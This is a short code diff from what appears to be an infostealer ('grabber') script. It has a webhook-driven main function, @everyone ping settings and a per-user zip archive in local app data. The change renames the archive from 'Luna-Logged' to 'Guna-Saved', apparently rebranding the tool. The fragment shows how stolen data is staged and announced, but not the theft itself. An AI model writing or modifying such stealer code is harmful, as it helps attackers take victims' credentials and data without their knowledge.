@@ -64,7 +64,7 @@ def main(webhook: str):
         "avatar_url": "https://avatars.githubusercontent.com/u/184970329?v=4"
     }
 
-    _file = f'{localappdata}\\Luna-Logged-{os.getlogin()}.zip'
+    _file = f'{localappdata}\\Guna-Saved-{os.getlogin()}.zip'
 
     if __CONFIG__["ping"]:
         if __CONFIG__["pingtype"] in ["Everyone", "Here"]:
